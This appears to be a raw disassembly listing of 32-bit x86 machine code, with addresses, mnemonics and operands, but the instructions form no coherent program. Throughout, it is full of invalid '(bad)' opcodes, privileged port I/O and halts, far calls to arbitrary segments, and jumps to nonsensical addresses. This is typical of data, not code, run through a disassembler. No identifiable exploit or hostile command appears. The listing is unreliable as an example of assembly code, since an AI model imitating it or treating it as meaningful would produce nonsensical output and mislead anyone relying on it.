  6abff0:	push   0xbad64072
  6abff5:	cmp    edi,DWORD PTR [ebx+0x5e]
  6abff8:	xor    edx,DWORD PTR [edx]
  6abffa:	xor    eax,0xb5d4669b
  6abfff:	dec    esp
  6ac000:	sbb    esp,DWORD PTR [eax-0x5]
  6ac003:	sub    ebx,eax
  6ac005:	lahf   
  6ac006:	out    dx,al
  6ac007:	dec    eax
  6ac008:	cmp    al,0x3c
  6ac00a:	imul   edi,DWORD PTR gs:[ecx+0x4f],0xffffffcc
  6ac00f:	addr16 cs in eax,0x48
  6ac013:	fwait
  6ac014:	push   ebx
  6ac015:	shr    ecx,0x12
  6ac018:	sti    
  6ac019:	jns    0x6ac00c
  6ac01b:	fidiv  DWORD PTR [esi]
  6ac01d:	jecxz  0x6abfc0
  6ac01f:	call   0xbce3:0x54d99553
  6ac026:	xchg   ebp,eax
  6ac027:	add    dh,BYTE PTR [ebp+0x3f]
  6ac02a:	(bad)
  6ac02e:	jbe    0x6ac011
  6ac030:	pop    ecx
  6ac031:	jnp    0x6abffc
  6ac033:	push   0x1c
  6ac035:	fcom   DWORD PTR [ecx-0x36f8dbf1]
  6ac03b:	pop    ebp
  6ac03c:	lods   eax,DWORD PTR ds:[esi]
  6ac03d:	and    cl,BYTE PTR [ecx+ebx*4]
  6ac040:	xchg   edx,eax
  6ac041:	dec    ebp
  6ac042:	daa    
  6ac043:	gs cmp eax,0x112b7679
  6ac049:	repz (bad) 
  6ac04b:	aad    0x2c
  6ac04d:	or     al,0x4a
  6ac04f:	jecxz  0x6ac073
  6ac051:	push   esp
  6ac052:	ins    DWORD PTR es:[edi],dx
  6ac053:	bsr    ebp,DWORD PTR [ebp+eiz*2+0x5bb9b4a5]
  6ac05b:	add    DWORD PTR [edx],edi
  6ac05d:	cmp    cl,BYTE PTR [ebx]
  6ac05f:	add    BYTE PTR [edi-0x2e4170a],dl
  6ac065:	push   edi
  6ac066:	data16 test al,0x38
  6ac069:	fsub   QWORD PTR [esi+0x43234e62]
  6ac06f:	jge    0x6abffe
  6ac071:	jecxz  0x6ac078
  6ac073:	aaa    
  6ac074:	mov    bl,0x90
  6ac076:	imul   ebx,DWORD PTR [ebx+0x58951c09],0x461c2d7b
  6ac080:	pop    ecx
  6ac081:	jle    0x6ac061
  6ac083:	add    eax,0xfd2ce791
  6ac088:	pop    ds
  6ac089:	push   0x44
  6ac08b:	sub    eax,0x3f6fa49c
  6ac090:	gs dec esi
  6ac092:	stc    
  6ac093:	mov    esi,esp
  6ac095:	ss call 0x6bee:0x7d643481
  6ac09d:	inc    ebp
  6ac09e:	in     al,dx
  6ac09f:	imul   DWORD PTR [ecx-0x73a0d150]
  6ac0a5:	fucomp st(6)
  6ac0a7:	aaa    
  6ac0a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ac0a9:	or     ebp,ebx
  6ac0ab:	les    ebp,FWORD PTR [ebx]
  6ac0ad:	fisttp QWORD PTR [edi+0xc]
  6ac0b0:	scas   al,BYTE PTR es:[edi]
  6ac0b1:	jg     0x6ac066
  6ac0b3:	jae    0x6ac104
  6ac0b5:	mov    ah,0x73
  6ac0b7:	leave  
  6ac0b8:	cld    
  6ac0b9:	stos   BYTE PTR es:[edi],al
  6ac0ba:	stc    
  6ac0bb:	pop    ebp
  6ac0bc:	and    DWORD PTR [ecx],ebx
  6ac0be:	out    dx,eax
  6ac0bf:	sbb    ch,bl
  6ac0c1:	push   es
  6ac0c2:	pop    esp
  6ac0c3:	outs   dx,BYTE PTR ds:[esi]
  6ac0c4:	(bad)  
  6ac0c5:	or     cx,WORD PTR [eax-0x63a81221]
  6ac0cc:	retf   
  6ac0cd:	cmc    
  6ac0ce:	setno  BYTE PTR [ebp-0x10067aeb]
  6ac0d5:	fwait
  6ac0d6:	add    bl,BYTE PTR ds:0x47d5a418
  6ac0dc:	or     al,0xf5
  6ac0de:	repz (bad) 
  6ac0e0:	in     eax,0xa3
  6ac0e2:	clc    
  6ac0e3:	jno    0x6ac119
  6ac0e5:	cmc    
  6ac0e6:	(bad)  
  6ac0e8:	gs mov bl,0xf5
  6ac0eb:	push   0x1a
  6ac0ed:	pop    ebx
  6ac0ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ac0ef:	sahf   
  6ac0f0:	(bad)  
  6ac0f1:	dec    edi
  6ac0f2:	mov    ds:0x76b1e80c,eax
  6ac0f7:	jmp    0x6ac156
  6ac0f9:	cld    
  6ac0fa:	xchg   ecx,eax
  6ac0fb:	call   0x9bda:0x3af7528b
  6ac102:	fnstcw WORD PTR [eax+0x31]
  6ac105:	fbld   TBYTE PTR [ecx+0x6c8dd030]
  6ac10b:	fdivr  DWORD PTR [ecx-0x33]
  6ac10e:	xor    edx,DWORD PTR [esi]
  6ac110:	mov    esi,0x77f02ad5
  6ac115:	jno    0x6ac11d
  6ac117:	(bad)  
  6ac118:	jne    0x6ac11e
  6ac11a:	mov    ds:0x30dfed91,al
  6ac11f:	call   0xd811:0x2ce0aba2
  6ac126:	sbb    esi,DWORD PTR [eax]
  6ac128:	or     al,0xb
  6ac12a:	dec    esp
  6ac12b:	sbb    eax,0x44ee5fa0
  6ac130:	dec    esi
  6ac131:	jmp    0x205b948e
  6ac136:	cdq    
  6ac137:	enter  0xa3a5,0xe2
  6ac13b:	and    DWORD PTR [ecx],eax
  6ac13d:	xor    DWORD PTR [ecx-0x58],edx
  6ac140:	es out dx,al
  6ac142:	xchg   ebx,eax
  6ac143:	fisub  DWORD PTR [esi+eax*2+0x46]
  6ac147:	pop    ecx
  6ac148:	dec    esi
  6ac149:	daa    
  6ac14a:	lea    ebx,[eax]
  6ac14c:	mov    eax,ds:0x58f78b87
  6ac151:	mov    WORD PTR [edx-0x50],fs
  6ac154:	sbb    DWORD PTR [ebp+0x7ed21e83],edx
  6ac15a:	adc    esi,DWORD PTR [ebx]
  6ac15c:	mov    ebp,0xb9eabde9
  6ac161:	rcl    dh,0xe4
  6ac164:	hlt    
  6ac165:	(bad)  
  6ac168:	iret   
  6ac169:	cmp    al,0x8c
  6ac16b:	push   edx
  6ac16c:	xor    al,0xcc
  6ac16e:	les    edx,FWORD PTR [ebx]
  6ac170:	dec    edx
  6ac171:	jecxz  0x6ac0fe
  6ac173:	sbb    dh,dh
  6ac175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ac176:	test   DWORD PTR [edx+0xe1ca5fb],edi
  6ac17c:	mov    ds:0x65dc5c69,eax
  6ac181:	xchg   ebp,eax
  6ac182:	bound  edx,QWORD PTR [edx]
  6ac184:	push   edx
  6ac185:	cld    
  6ac186:	or     ch,bh
  6ac188:	sahf   
  6ac189:	out    0x6c,al
  6ac18b:	add    BYTE PTR [ebx],cl
  6ac18d:	aad    0xa0
  6ac18f:	xchg   ecx,eax
  6ac190:	(bad)  
  6ac192:	sahf   
  6ac193:	mov    esp,0x4c964d76
  6ac198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ac199:	faddp  st(0),st
  6ac19b:	add    eax,ecx
  6ac19d:	push   0x8b3df62a
  6ac1a2:	cli    
  6ac1a3:	push   0xd6b2be7d
  6ac1a8:	repnz pop eax
  6ac1aa:	xchg   BYTE PTR [eax+0x231d7b7f],dh
  6ac1b0:	add    ch,BYTE PTR [edi]
  6ac1b2:	test   DWORD PTR [eax+0x69],edx
  6ac1b5:	test   DWORD PTR [edx+0x75245544],ecx
  6ac1bb:	jmp    0x4ef6c3ef
  6ac1c0:	repnz iret 
  6ac1c2:	fnsave [eax-0x21b302a0]
  6ac1c8:	ins    BYTE PTR es:[edi],dx
  6ac1c9:	mov    dl,0x21
  6ac1cb:	or     BYTE PTR [edi+0x59],al
  6ac1ce:	lods   al,BYTE PTR ds:[esi]
  6ac1cf:	cwde   
  6ac1d0:	inc    ebp
  6ac1d1:	mov    eax,0x7f6aa521
  6ac1d6:	shr    DWORD PTR [ecx+0x6],1
  6ac1d9:	call   0xb09:0x9df177f
  6ac1e0:	fld    st(4)
  6ac1e2:	mov    ebp,0x8b6313cc
  6ac1e7:	ins    DWORD PTR es:[edi],dx
  6ac1e8:	sbb    BYTE PTR [edx-0x623bce7d],dh
  6ac1ee:	hlt    
  6ac1ef:	xchg   esp,eax
  6ac1f0:	sub    dl,BYTE PTR [eax]
  6ac1f2:	push   ss
  6ac1f3:	xor    eax,0xe522de9e
  6ac1f8:	sbb    BYTE PTR [edx],al
  6ac1fa:	shl    BYTE PTR [edi+0x47],0x9c
  6ac1fe:	pop    es
  6ac1ff:	clc    
  6ac200:	jbe    0x6ac205
  6ac202:	push   cs
  6ac203:	repz mov ah,0xe1
  6ac206:	jno    0x6ac281
  6ac208:	sti    
  6ac209:	add    BYTE PTR [esi],cl
  6ac20b:	inc    ebx
  6ac20c:	loop   0x6ac26a
  6ac20e:	fisubr WORD PTR [esi+esi*8-0x45]
  6ac212:	mov    al,0x3c
  6ac214:	jo     0x6ac1c0
  6ac216:	mov    cl,0xb4
  6ac218:	data16 mov al,ds:0x21ebeb9a
  6ac21e:	pop    edx
  6ac21f:	cwde   
  6ac220:	cmp    BYTE PTR [eax+0x2f6c99f1],bh
  6ac226:	sar    BYTE PTR [edi-0x2e],0xe9
  6ac22a:	push   eax
  6ac22b:	aas    
  6ac22c:	mov    ebx,0xd2de143f
  6ac231:	xchg   BYTE PTR [eax+0x44],dh
  6ac234:	pop    edi
  6ac235:	aas    
  6ac236:	xchg   edx,ecx
  6ac238:	lods   al,BYTE PTR ds:[esi]
  6ac239:	idiv   eax
  6ac23b:	lods   eax,DWORD PTR ds:[esi]
  6ac23c:	jmp    0x6ac22b
  6ac23e:	mov    edi,0x3dc0c78d
  6ac243:	sub    eax,0xede4681e
  6ac248:	push   cs
  6ac249:	arpl   WORD PTR [esi],sp
  6ac24b:	ds out dx,eax
  6ac24d:	mul    esi
  6ac24f:	rcr    BYTE PTR [edi+0x30],0x4d
  6ac253:	xchg   ecx,eax
  6ac254:	(bad)  
  6ac255:	scas   eax,DWORD PTR es:[edi]
  6ac256:	ret    
  6ac257:	div    DWORD PTR [edi+0x44c97172]
  6ac25d:	xchg   ebx,eax
  6ac25e:	jmp    0xc59ac739
  6ac263:	push   es
  6ac264:	xchg   esp,eax
  6ac265:	push   edi
  6ac266:	or     esi,DWORD PTR [ebp+0x4d6e2027]
  6ac26c:	fsubp  st(6),st
  6ac26e:	or     ebx,ebx
  6ac270:	test   DWORD PTR [edi-0x48ce6e43],ebp
  6ac276:	xor    dh,BYTE PTR [esi]
  6ac278:	add    eax,0x77d847ae
  6ac27d:	leave  
  6ac27e:	xor    edi,0x71
  6ac281:	(bad)  
  6ac282:	xor    BYTE PTR [edi-0x59dce223],ah
  6ac288:	mov    ds:0x862990da,eax
  6ac28d:	and    cl,bl
  6ac28f:	gs mov esi,0x44a8acc2
  6ac295:	xor    BYTE PTR [edi+0x3b],cl
  6ac298:	adc    ch,BYTE PTR [edi-0x17367422]
  6ac29e:	inc    esp
  6ac29f:	lock cwde 
  6ac2a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ac2a2:	jnp    0x6ac279
  6ac2a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ac2a5:	test   eax,0x2b72fb8d
  6ac2aa:	pop    edi
  6ac2ab:	xor    al,0xf6
  6ac2ad:	pop    esi
  6ac2ae:	sar    DWORD PTR [esi],cl
  6ac2b0:	loop   0x6ac271
  6ac2b2:	push   0xffffff8b
  6ac2b4:	inc    esi
  6ac2b5:	cli    
  6ac2b6:	imul   edi,DWORD PTR [esi-0x1b],0xffffffbe
  6ac2ba:	cmc    
  6ac2bb:	mov    DWORD PTR [esi-0x4bbcc1da],ecx
  6ac2c1:	pop    ebx
  6ac2c2:	mov    edx,0xad38befb
  6ac2c7:	sahf   
  6ac2c8:	sar    BYTE PTR [edi+ecx*4],cl
  6ac2cb:	xor    DWORD PTR [edi-0x6a],esi
  6ac2ce:	fsubrp st(3),st
  6ac2d0:	das    
  6ac2d1:	aaa    
  6ac2d2:	sub    DWORD PTR [ebx+0x67063da8],eax
  6ac2d8:	add    dl,dl
  6ac2da:	sti    
  6ac2db:	jp     0x6ac328
  6ac2dd:	jnp    0x6ac2ac
  6ac2df:	sub    ebx,edi
  6ac2e1:	xchg   DWORD PTR [eax],ecx
  6ac2e3:	cmp    DWORD PTR [ebx+0x795ef07d],edi
  6ac2e9:	and    eax,0x71dc37bb
  6ac2ee:	les    esp,FWORD PTR [esi-0x4b]
  6ac2f1:	shl    eax,1
  6ac2f3:	xlat   BYTE PTR ds:[ebx]
  6ac2f4:	and    al,0x60
  6ac2f6:	adc    DWORD PTR [eax+ebx*1+0x36],ebx
  6ac2fa:	mov    edx,0xc4b3f76c
  6ac2ff:	jbe    0x6ac2a9
  6ac301:	nop
  6ac302:	lods   eax,DWORD PTR es:[esi]
  6ac304:	mov    al,ds:0x7351e9ad
  6ac309:	pop    eax
  6ac30a:	add    esp,eax
  6ac30c:	inc    eax
  6ac30d:	add    al,0x5d
  6ac30f:	dec    esp
  6ac310:	xchg   edx,eax
  6ac311:	push   esi
  6ac312:	arpl   bp,bx
  6ac314:	xor    esp,DWORD PTR [esi*1+0x748ecfdd]
  6ac31b:	xchg   eax,esi
  6ac31d:	aaa    
  6ac31e:	add    al,0xf7
  6ac320:	or     BYTE PTR [ebp-0x5632e751],dl
  6ac326:	push   ds
  6ac327:	fld    DWORD PTR [ebp-0xe679724]
  6ac32d:	cli    
  6ac32e:	fwait
  6ac32f:	adc    al,0x8c
  6ac331:	fs adc esp,edi
  6ac334:	inc    ecx
  6ac335:	pop    edi
  6ac336:	stos   BYTE PTR es:[edi],al
  6ac337:	das    
  6ac338:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ac33a:	sub    cl,BYTE PTR [ebx]
  6ac33c:	mov    cl,0x4b
  6ac33e:	pushf  
  6ac33f:	or     bh,BYTE PTR [ebx+esi*2]
  6ac342:	cli    
  6ac343:	adc    BYTE PTR [eax-0xef591fe],0xe4
  6ac34a:	rcr    ecx,1
  6ac34c:	sub    DWORD PTR [eax-0x59],0xf79d7e26
  6ac353:	and    BYTE PTR [esi+0x3f1557ca],bh
  6ac359:	and    ch,dl
  6ac35b:	cmp    al,0x8b
  6ac35d:	dec    ebx
  6ac35e:	nop
  6ac35f:	push   ecx
  6ac360:	adc    BYTE PTR [edx+0x71],dl
  6ac363:	mov    esi,0x553c71a4
  6ac368:	scas   eax,DWORD PTR es:[edi]
  6ac369:	sahf   
  6ac36a:	jno    0x6ac360
  6ac36c:	push   0xffffffb4
  6ac36e:	sbb    BYTE PTR ds:0x4542f422,ch
  6ac374:	fwait
  6ac375:	enter  0x7800,0x76
  6ac379:	int3   
  6ac37a:	adc    eax,0xfea050fc
  6ac37f:	sbb    bh,ch
  6ac381:	mov    ebp,0x1ccbdf1d
  6ac386:	shl    BYTE PTR [eax],1
  6ac388:	lods   al,BYTE PTR ds:[esi]
  6ac389:	push   cs
  6ac38a:	cld    
  6ac38b:	mov    esp,0x7dcd5fba
  6ac390:	dec    esi
  6ac391:	or     al,0xca
  6ac393:	(bad)  [esi+0x2e6fb6fd]
  6ac399:	xchg   ebx,eax
  6ac39a:	jno    0x6ac3f3
  6ac39c:	stos   DWORD PTR es:[edi],eax
  6ac39d:	mov    eax,0xae727869
  6ac3a2:	pop    esi
  6ac3a3:	leave  
  6ac3a4:	sbb    BYTE PTR [esi+0x126537d],ch
  6ac3aa:	pop    eax
  6ac3ab:	outs   dx,BYTE PTR ds:[esi]
  6ac3ac:	jecxz  0x6ac34b
  6ac3ae:	inc    edx
  6ac3af:	in     eax,0x3c
  6ac3b1:	hlt    
  6ac3b2:	loopne 0x6ac35f
  6ac3b4:	scas   eax,DWORD PTR es:[edi]
  6ac3b5:	out    0x24,al
  6ac3b7:	popf   
  6ac3b8:	scas   eax,DWORD PTR es:[edi]
  6ac3b9:	(bad)  
  6ac3bb:	mov    ebx,0xffc9ce84
  6ac3c0:	sub    ebx,DWORD PTR [esi+0x1f]
  6ac3c3:	xor    esp,DWORD PTR [ecx]
  6ac3c5:	xchg   DWORD PTR [edx-0x6650f944],ecx
  6ac3cb:	xchg   esi,eax
  6ac3cc:	shrd   DWORD PTR [esi+0x46ee21f1],esi,cl
  6ac3d3:	mov    esp,0x4ddccb3e
  6ac3d8:	mov    dl,0x8d
  6ac3da:	or     al,BYTE PTR [eax]
  6ac3dc:	ins    BYTE PTR es:[edi],dx
  6ac3dd:	mov    bl,BYTE PTR [edi-0x25]
  6ac3e0:	pop    es
  6ac3e1:	cld    
  6ac3e2:	stos   DWORD PTR es:[edi],eax
  6ac3e3:	sub    al,0xe5
  6ac3e5:	call   0xb679dda9
  6ac3ea:	aaa    
  6ac3eb:	sbb    DWORD PTR [ecx-0x68ef1ff1],esi
  6ac3f1:	xchg   ebp,eax
  6ac3f2:	aad    0x25
  6ac3f4:	bound  edi,QWORD PTR [esi]
  6ac3f6:	xor    DWORD PTR [esi],ebx
  6ac3f8:	jle    0x6ac39d
  6ac3fa:	fst    st(5)
  6ac3fc:	loop   0x6ac3d1
  6ac3fe:	jp     0x6ac407
  6ac400:	xchg   ecx,eax
  6ac401:	in     al,0x8b
  6ac403:	aad    0x51
  6ac405:	xor    eax,0xaf91e7f9
  6ac40a:	es dec edx
  6ac40c:	dec    ebp
  6ac40d:	jo     0x6ac46b
  6ac40f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ac410:	sbb    BYTE PTR [esi+0x6d],al
  6ac413:	mov    eax,ds:0x7122b795
  6ac418:	fnstcw WORD PTR ds:0x107005e3
  6ac41e:	mov    WORD PTR [ecx],?
  6ac420:	xor    BYTE PTR [esi+0x32a8704a],ah
  6ac426:	xor    BYTE PTR [ebx+edi*4-0x438ee462],al
  6ac42d:	pushf  
  6ac42e:	les    edx,FWORD PTR [ecx+0x31025c5a]
  6ac434:	into   
  6ac435:	fistp  WORD PTR [ebp-0x30fa1297]
  6ac43b:	xor    ebx,DWORD PTR [ebp+0x2e]
  6ac43e:	mov    ds:0xb912bc32,al
  6ac443:	mov    al,ds:0x3adf64ed
  6ac448:	ret    
  6ac449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ac44a:	enter  0xd162,0x3
  6ac44e:	adc    al,0xa0
  6ac450:	xchg   esi,eax
  6ac451:	iret   
  6ac452:	mov    edi,0x877d64d7
  6ac457:	lock jp 0x6ac4a4
  6ac45a:	or     DWORD PTR [esi+esi*8-0x3a],eax
  6ac45e:	dec    edx
  6ac45f:	push   cs
  6ac460:	or     BYTE PTR [ecx-0x14],bh
  6ac463:	add    BYTE PTR [ecx],ah
  6ac465:	ret    0x19b0
  6ac468:	adc    dh,BYTE PTR [esi-0x1f48556]
  6ac46e:	mov    al,cl
  6ac470:	outs   dx,BYTE PTR ds:[esi]
  6ac471:	add    al,0xfc
  6ac473:	int    0x4
  6ac475:	(bad)  
  6ac476:	or     al,0x46
  6ac478:	scas   al,BYTE PTR es:[edi]
  6ac479:	add    bl,0x7d
  6ac47c:	les    ecx,FWORD PTR [eax]
  6ac47e:	ins    DWORD PTR es:[edi],dx
  6ac47f:	xchg   ebp,eax
  6ac480:	inc    ecx
  6ac481:	daa    
  6ac482:	mov    esp,0xe7b3bc3c
  6ac487:	int3   
  6ac488:	inc    eax
  6ac489:	mul    BYTE PTR [esi]
  6ac48b:	mov    edi,0x2a6ccb57
  6ac490:	and    eax,0x2e0e69cd
  6ac495:	xor    bl,BYTE PTR [ebx-0x65]
  6ac498:	sub    eax,DWORD PTR [edx+0x2c]
  6ac49b:	fdiv   st,st(6)
  6ac49d:	adc    ch,0xe
  6ac4a0:	(bad)  
  6ac4a1:	cmp    edx,DWORD PTR [esi]
  6ac4a3:	pop    ds
  6ac4a4:	out    dx,al
  6ac4a5:	pop    edi
  6ac4a6:	cli    
  6ac4a7:	mov    eax,0x8bdf5ab4
  6ac4ac:	jecxz  0x6ac498
  6ac4ae:	and    eax,ecx
  6ac4b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ac4b1:	push   0xe7a1133b
  6ac4b6:	les    eax,FWORD PTR [esp+ecx*2+0x58]
  6ac4ba:	shl    DWORD PTR [edx],0x8c
  6ac4bd:	(bad)  
  6ac4be:	loopne 0x6ac46c
  6ac4c0:	sbb    BYTE PTR [ecx-0x6a9829b1],bl
  6ac4c6:	fwait
  6ac4c7:	push   ds
  6ac4c8:	push   edx
  6ac4c9:	call   0x44bc:0x28d110a6
  6ac4d0:	gs (bad) 
  6ac4d3:	pop    edx
  6ac4d4:	jb     0x6ac49c
  6ac4d6:	das    
  6ac4d7:	push   edx
  6ac4d8:	mov    bl,0x3d
  6ac4da:	or     al,0x9d
  6ac4dc:	fisub  DWORD PTR [ecx+ebx*1-0x44]
  6ac4e0:	dec    ecx
  6ac4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ac4e2:	xor    al,0x91
  6ac4e4:	jmp    0x6ac4dc
  6ac4e6:	daa    
  6ac4e7:	add    ecx,DWORD PTR [esi-0x67d9d2f]
  6ac4ed:	xchg   esi,eax
  6ac4ee:	lahf   
  6ac4ef:	mov    dh,0x5b
  6ac4f1:	or     DWORD PTR [ebp-0x408e05c9],eax
  6ac4f7:	add    BYTE PTR [edx+0x4505522a],0xe5
  6ac4fe:	loop   0x6ac496
  6ac500:	jecxz  0x6ac4d7
  6ac502:	in     al,dx
  6ac503:	xchg   esp,eax
  6ac504:	ret    
  6ac505:	dec    edi
  6ac506:	sbb    eax,0x9a688746
  6ac50b:	xchg   BYTE PTR [edi+0x7a],bh
  6ac50e:	ret    0x442f
  6ac511:	call   0xc86cbbb
  6ac516:	add    eax,0xe71c16dd
  6ac51b:	adc    DWORD PTR [ebx],edx
  6ac51d:	loope  0x6ac591
  6ac51f:	out    0xd8,eax
  6ac521:	call   0x6f086622
  6ac526:	mov    WORD PTR [ebx+esi*8+0x33],ds
  6ac52a:	outs   dx,DWORD PTR ds:[esi]
  6ac52b:	cmc    
  6ac52c:	xor    DWORD PTR [esi],edi
  6ac52e:	jle    0x6ac577
  6ac530:	ficom  WORD PTR [ecx]
  6ac532:	inc    edx
  6ac533:	(bad)  
  6ac534:	mov    esp,0xabc1f10
  6ac539:	loope  0x6ac537
  6ac53b:	xchg   BYTE PTR [eax+0x8177906],bh
  6ac541:	mov    dh,0x21
  6ac543:	push   ds
  6ac544:	lods   eax,DWORD PTR ds:[esi]
  6ac545:	jnp    0x6ac548
  6ac547:	dec    edx
  6ac548:	xchg   ecx,eax
  6ac549:	mov    eax,ds:0xbb023913
  6ac54e:	(bad)  
  6ac54f:	push   eax
  6ac550:	cld    
  6ac551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ac552:	je     0x6ac561
  6ac554:	mov    bl,0x43
  6ac556:	out    0x31,eax
  6ac558:	imul   ebp,DWORD PTR [edi],0x32af10a6
  6ac55e:	jecxz  0x6ac585
  6ac560:	(bad)  
  6ac561:	mov    bl,0x43
  6ac563:	dec    ebp
  6ac564:	mov    edi,0xb0bc84f4
  6ac569:	push   edx
  6ac56a:	sbb    edi,eax
  6ac56c:	adc    eax,0x2ed2b694
  6ac571:	fs retf 0xa153
  6ac575:	mov    ebx,0x68c13799
  6ac57a:	add    ah,bl
  6ac57c:	(bad)  
  6ac57d:	sbb    DWORD PTR [si+0x6aca],edx
  6ac582:	xchg   edx,eax
  6ac583:	clc    
  6ac584:	in     eax,0x5b
  6ac586:	cmp    DWORD PTR [eax],edx
  6ac588:	sbb    BYTE PTR [edi-0x1b],0x3d
  6ac58c:	(bad)  
  6ac58d:	fs push cs
  6ac58f:	pusha  
  6ac590:	aas    
  6ac591:	cwde   
  6ac592:	and    dh,ch
  6ac594:	dec    ebp
  6ac595:	scas   al,BYTE PTR es:[edi]
  6ac596:	mov    cl,0x1d
  6ac598:	hlt    
  6ac599:	inc    ecx
  6ac59a:	in     eax,0x28
  6ac59c:	retf   0x32ac
  6ac59f:	pushf  
  6ac5a0:	sbb    esi,DWORD PTR [ebx-0x252a384c]
  6ac5a6:	cwde   
  6ac5a7:	jno    0x6ac5a4
  6ac5a9:	jg     0x6ac5a6
  6ac5ab:	hlt    
  6ac5ac:	repz xor BYTE PTR [ebp-0x2c],dl
  6ac5b0:	push   eax
  6ac5b1:	inc    edi
  6ac5b2:	mov    edx,DWORD PTR [eax-0x49]
  6ac5b5:	int    0xfe
  6ac5b7:	pop    edi
  6ac5b8:	leave  
  6ac5b9:	pop    eax
  6ac5ba:	sti    
  6ac5bb:	ret    
  6ac5bc:	mov    ds:0x8b144191,eax
  6ac5c1:	mov    edx,0x5fb4f9de
  6ac5c6:	je     0x6ac564
  6ac5c8:	pop    ebp
  6ac5c9:	gs rcl bl,cl
  6ac5cc:	test   eax,0x61d71ad3
  6ac5d1:	test   al,0xe1
  6ac5d3:	add    ecx,DWORD PTR [eax+0x2f6637a6]
  6ac5d9:	lods   eax,DWORD PTR ds:[esi]
  6ac5da:	sub    al,0xf5
  6ac5dc:	iret   
  6ac5dd:	pushf  
  6ac5de:	into   
  6ac5df:	push   0xfffffffd
  6ac5e1:	test   BYTE PTR [edx-0x54a0716d],ch
  6ac5e7:	xchg   ebp,eax
  6ac5e8:	jne    0x6ac593
  6ac5ea:	xlat   BYTE PTR ds:[ebx]
  6ac5eb:	mov    al,0xb5
  6ac5ed:	xchg   ebp,eax
  6ac5ee:	mov    edx,0x9e617726
  6ac5f3:	call   0xe98c:0x116bc238
  6ac5fa:	pushf  
  6ac5fb:	ins    DWORD PTR es:[edi],dx
  6ac5fc:	dec    ecx
  6ac5fd:	out    dx,eax
  6ac5fe:	aaa    
  6ac5ff:	hlt    
  6ac600:	xor    al,0x73
  6ac602:	adc    edx,DWORD PTR [eax]
  6ac604:	out    dx,al
  6ac605:	pop    eax
  6ac606:	stos   BYTE PTR es:[edi],al
  6ac607:	test   cl,al
  6ac609:	into   
  6ac60a:	pop    ss
  6ac60b:	loopne 0x6ac686
  6ac60d:	jg     0x6ac662
  6ac60f:	cdq    
  6ac610:	fnstcw WORD PTR [eax]
  6ac612:	mov    ebx,0x2bd5beb4
  6ac617:	and    eax,0x6a17831a
  6ac61c:	push   ds
  6ac61d:	and    eax,0xf8c3095e
  6ac622:	push   ss
  6ac623:	mov    edx,0x8b04d2d2
  6ac628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ac629:	rcr    DWORD PTR [ebp-0x3],0x42
  6ac62d:	mov    eax,0xcc42d5ae
  6ac632:	mov    bl,0x33
  6ac634:	(bad)  
  6ac635:	pop    ecx
  6ac636:	cmc    
  6ac637:	mov    al,dh
  6ac639:	js     0x6ac660
  6ac63b:	lods   al,BYTE PTR ds:[esi]
  6ac63c:	xor    BYTE PTR [edx+0x3e],bl
  6ac63f:	cmp    eax,0x98b6e154
  6ac644:	add    eax,0x3a9cef6a
  6ac649:	fld    QWORD PTR [edi+0x1a2a47e9]
  6ac64f:	cmp    al,0xe7
  6ac651:	ins    BYTE PTR es:[edi],dx
  6ac652:	jmp    0x6df8102c
  6ac657:	call   0x7ed54cb9
  6ac65c:	in     eax,0x74
  6ac65e:	sub    BYTE PTR [ecx-0x3d40945f],al
  6ac664:	dec    esp
  6ac665:	jb     0x6ac6a1
  6ac667:	repnz sub esp,0xca6bacee
  6ac66e:	sub    DWORD PTR [esi-0x4d],edi
  6ac671:	rcr    DWORD PTR [edi+0x69],cl
  6ac674:	jbe    0x6ac654
  6ac676:	and    ebx,DWORD PTR ds:0xe80e1488
  6ac67c:	push   esi
  6ac67d:	jg     0x6ac6a8
  6ac67f:	or     al,0x4c
  6ac681:	stos   BYTE PTR es:[edi],al
  6ac682:	aas    
  6ac683:	leave  
  6ac684:	aam    0xa1
  6ac686:	xor    bh,dl
  6ac688:	jmp    0x50da8de4
  6ac68d:	add    DWORD PTR [edi],eax
  6ac68f:	adc    bh,BYTE PTR [ebx+eiz*8-0x2e7d8c99]
  6ac696:	test   DWORD PTR [eax],ebx
  6ac698:	add    eax,0x74e07877
  6ac69d:	sbb    al,BYTE PTR [edx]
  6ac69f:	sub    al,BYTE PTR [esi-0x4ec669d5]
  6ac6a5:	out    dx,eax
  6ac6a6:	mov    bl,0x3b
  6ac6a8:	ins    BYTE PTR es:[edi],dx
  6ac6a9:	addr16 sbb dh,al
  6ac6ac:	and    eax,DWORD PTR [edi-0x661fcb82]
  6ac6b2:	inc    ebx
  6ac6b3:	hlt    
  6ac6b4:	scas   eax,DWORD PTR es:[edi]
  6ac6b5:	mov    BYTE PTR fs:[ecx-0x207cfc1d],dh
  6ac6bc:	out    0x2a,al
  6ac6be:	in     eax,dx
  6ac6bf:	and    al,0xe2
  6ac6c1:	cli    
  6ac6c2:	icebp  
  6ac6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ac6c4:	sub    al,0xdf
  6ac6c6:	test   BYTE PTR [eax+ebp*1-0x4f],ch
  6ac6ca:	lea    esi,[ecx+0x5e53ec9a]
  6ac6d0:	int    0xc1
  6ac6d2:	aam    0x6e
  6ac6d4:	sub    BYTE PTR [eax-0x2b],ah
  6ac6d7:	shl    DWORD PTR [ebx],cl
  6ac6d9:	xor    edi,ebx
  6ac6db:	pop    edi
  6ac6dc:	retf   
  6ac6dd:	in     al,dx
  6ac6de:	stos   DWORD PTR es:[edi],eax
  6ac6df:	fnstcw WORD PTR [ecx-0x48]
  6ac6e2:	push   cs
  6ac6e3:	mov    eax,ds:0x2e2c4f29
  6ac6e8:	mov    dh,0xf3
  6ac6ea:	pop    ecx
  6ac6eb:	div    BYTE PTR ds:0xae537d69
